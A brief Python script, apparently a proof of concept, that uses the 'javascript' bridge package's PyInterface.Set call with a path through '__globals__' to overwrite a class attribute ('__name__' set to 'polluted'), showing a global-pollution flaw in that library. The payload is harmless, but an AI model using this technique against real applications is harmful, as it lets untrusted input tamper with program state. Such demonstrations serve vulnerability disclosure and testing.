from javascript.pyi import PyInterface
from javascript import config, events

interface = PyInterface(events.EventLoop(), config.executor)

interface.Set("", 0, ['python','__globals__','PyInterface'], ('__name__', 'polluted'))
print(PyInterface.__name__)